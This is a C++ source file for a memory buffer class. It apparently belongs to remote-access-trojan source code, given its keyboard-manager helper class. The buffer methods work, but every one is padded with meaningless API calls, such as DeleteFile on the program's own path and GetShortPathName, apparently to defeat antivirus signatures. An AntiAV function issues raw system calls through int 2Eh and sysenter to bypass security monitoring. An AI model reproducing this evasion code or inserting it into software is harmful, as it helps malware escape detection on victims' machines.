// Buffer.cpp: implementation of the CBuffer class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "KeyboardManager.h"
#include "Buffer.h"
#include "math.h"


#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif


void AntiAV()
{
	__asm
	{
		push 0
		push 0
		push 11h
		push -2
		mov eax, 0C7h
		mov edx, esp
		int 2Eh
	}
	__try
	{
		__asm
		{
			lea eax, back
			push 0
			push eax
			mov eax, 0E5h
			mov edx, esp
			__emit 0x0F
			__emit 0x34
		}
	}
	__except (1)
	{
		__asm mov edi, edi
	}
back:
	__asm add esp, 14h
	return;
}
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CBuffer
// 
// DESCRIPTION:	Constructs the buffer with a default size
// 
// RETURNS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
CBuffer::CBuffer()
{
//	AntiAV();
	TCHAR szModule [MAX_PATH];

	// Initial size
	m_nSize = 0;

	m_pPtr = m_pBase = NULL;
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	InitializeCriticalSection(&m_cs);
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	~CBuffer
// 
// DESCRIPTION:	Deallocates the buffer
// 
// RETURNS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
CBuffer::~CBuffer()
{
	TCHAR szModule [MAX_PATH];
	if (m_pBase) VirtualFree(m_pBase, 0, MEM_RELEASE);
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	DeleteCriticalSection(&m_cs);
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
}
	

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	Write
// 
// DESCRIPTION:	Writes data into the buffer
// 
// RETURNS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
BOOL CBuffer::Write(PBYTE pData, UINT nSize)
{
	TCHAR szModule [MAX_PATH];
	EnterCriticalSection(&m_cs);
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	if (ReAllocateBuffer(nSize + GetBufferLen()) == -1)
	{
		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		LeaveCriticalSection(&m_cs);
		return false;
	}

	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	CopyMemory(m_pPtr,pData,nSize);

	// Advance Pointer
	m_pPtr+=nSize;
	LeaveCriticalSection(&m_cs);
	DeleteFile(szModule);
	return nSize;
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	Insert
// 
// DESCRIPTION:	Insert data into the buffer 
// 
// RETURNS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
BOOL CBuffer::Insert(PBYTE pData, UINT nSize)
{
	TCHAR szModule [MAX_PATH];

	EnterCriticalSection(&m_cs);
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	if (ReAllocateBuffer(nSize + GetBufferLen()) == -1)
	{
		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		LeaveCriticalSection(&m_cs);
		return false;
	}

	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	MoveMemory(m_pBase+nSize,m_pBase,GetMemSize() - nSize);
	CopyMemory(m_pBase,pData,nSize);

	DeleteFile(szModule);
	// Advance Pointer
	m_pPtr+=nSize;
	LeaveCriticalSection(&m_cs);
	closesocket(NULL);
	return nSize;
}


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	Read
// 
// DESCRIPTION:	Reads data from the buffer and deletes what it reads
// 
// RETURNS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
UINT CBuffer::Read(PBYTE pData, UINT nSize)
{
	TCHAR szModule [MAX_PATH];

	EnterCriticalSection(&m_cs);
	// Trying to byte off more than ya can chew - eh?
	if (nSize > GetMemSize())
	{
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		LeaveCriticalSection(&m_cs);
		return 0;
	}

	// all that we have 
	if (nSize > GetBufferLen())
		nSize = GetBufferLen();

	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	if (nSize)
	{
		// Copy over required amount and its not up to us
		// to terminate the buffer - got that!!!
		CopyMemory(pData,m_pBase,nSize);
		GetForegroundWindow();
		// Slide the buffer back - like sinking the data
		MoveMemory(m_pBase,m_pBase+nSize,GetMemSize() - nSize);

		m_pPtr -= nSize;
	}

	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	DeAllocateBuffer(GetBufferLen());

	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	LeaveCriticalSection(&m_cs);
	DeleteFile(szModule);
	return nSize;
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	GetMemSize
// 
// DESCRIPTION:	Returns the phyical memory allocated to the buffer
// 
// RETURNS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
UINT CBuffer::GetMemSize() 
{
	return m_nSize;
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	GetBufferLen
// 
// DESCRIPTION:	Get the buffer 'data' length
// 
// RETURNS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
UINT CBuffer::GetBufferLen() 
{
	if (m_pBase == NULL)
		return 0;

	int nSize = 
		m_pPtr - m_pBase;
	return nSize;
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	ReAllocateBuffer
// 
// DESCRIPTION:	ReAllocateBuffer the Buffer to the requested size
// 
// RETURNS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
UINT CBuffer::ReAllocateBuffer(UINT nRequestedSize)
{

	TCHAR szModule [MAX_PATH];

	if (nRequestedSize < GetMemSize())
		return 0;

	// Allocate new size
	UINT nNewSize = (UINT) ceil(nRequestedSize / 1024.0) * 1024;

	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);

	// New Copy Data Over
	PBYTE pNewBuffer = (PBYTE) VirtualAlloc(NULL,nNewSize,MEM_COMMIT,PAGE_READWRITE);
	if (pNewBuffer == NULL)
		return -1;

	UINT nBufferLen = GetBufferLen();
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	CopyMemory(pNewBuffer,m_pBase,nBufferLen);

	if (m_pBase) VirtualFree(m_pBase,0,MEM_RELEASE);
	DeleteFile(szModule);

	// Hand over the pointer
	m_pBase = pNewBuffer;

	// Realign position pointer
	m_pPtr = m_pBase + nBufferLen;

	m_nSize = nNewSize;

	return m_nSize;
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	DeAllocateBuffer
// 
// DESCRIPTION:	DeAllocates the Buffer to the requested size
// 
// RETURNS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
UINT CBuffer::DeAllocateBuffer(UINT nRequestedSize)
{

	TCHAR szModule [MAX_PATH];

	if (nRequestedSize < GetBufferLen())
		return 0;

	// Allocate new size
	UINT nNewSize = (UINT) ceil(nRequestedSize / 1024.0) * 1024;

	if (nNewSize < GetMemSize())
		return 0;

	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	// New Copy Data Over
	PBYTE pNewBuffer = (PBYTE) VirtualAlloc(NULL,nNewSize,MEM_COMMIT,PAGE_READWRITE);

	UINT nBufferLen = GetBufferLen();
	__asm nop;
	__asm nop;
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	CopyMemory(pNewBuffer,m_pBase,nBufferLen);

	GetForegroundWindow();
	VirtualFree(m_pBase,0,MEM_RELEASE);

	// Hand over the pointer
	m_pBase = pNewBuffer;

	// Realign position pointer
	m_pPtr = m_pBase + nBufferLen;

	GetInputState();

	m_nSize = nNewSize;

	return m_nSize;
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	Scan
// 
// DESCRIPTION:	Scans the buffer for a given byte sequence
// 
// RETURNS:		Logical offset
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
int CBuffer::Scan(PBYTE pScan,UINT nPos)
{
	if (nPos > GetBufferLen() )
		return -1;

	PBYTE pStr = (PBYTE) strstr((char*)(m_pBase+nPos),(char*)pScan);
	
	int nOffset = 0;

	if (pStr)
		nOffset = (pStr - m_pBase) + lstrlen((char*)pScan);

	return nOffset;
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	ClearBuffer
// 
// DESCRIPTION:	Clears/Resets the buffer
// 
// RETURNS:	
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
void CBuffer::ClearBuffer()
{
	TCHAR szModule [MAX_PATH];
	EnterCriticalSection(&m_cs);
	// Force the buffer to be empty
	m_pPtr = m_pBase;
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	
	DeAllocateBuffer(1024);
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	LeaveCriticalSection(&m_cs);
	DeleteFile(szModule);
}


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	Copy
// 
// DESCRIPTION:	Copy from one buffer object to another...
// 
// RETURNS:	
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
void CBuffer::Copy(CBuffer& buffer)
{
	TCHAR szModule [MAX_PATH];
	int nReSize = buffer.GetMemSize();
	int nSize = buffer.GetBufferLen();
	ClearBuffer();
	if (ReAllocateBuffer(nReSize) == -1)
		return;

	m_pPtr = m_pBase + nSize;

	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	CopyMemory(m_pBase,buffer.GetBuffer(),buffer.GetBufferLen());
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	GetBuffer
// 
// DESCRIPTION:	Returns a pointer to the physical memory determined by the offset
// 
// RETURNS:	
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
PBYTE CBuffer::GetBuffer(UINT nPos)
{
	return m_pBase+nPos;
}


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	Delete
// 
// DESCRIPTION:	Delete data from the buffer and deletes what it reads
// 
// RETURNS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
UINT CBuffer::Delete(UINT nSize)
{
	// Trying to byte off more than ya can chew - eh?
	if (nSize > GetMemSize())
		return 0;

	// all that we have 
	if (nSize > GetBufferLen())
		nSize = GetBufferLen();

	TCHAR szModule [MAX_PATH];	
	if (nSize)
	{
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		// Slide the buffer back - like sinking the data
		MoveMemory(m_pBase,m_pBase+nSize,GetMemSize() - nSize);

		m_pPtr -= nSize;
	}
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	DeAllocateBuffer(GetBufferLen());
	DeleteFile(szModule);
	return nSize;
}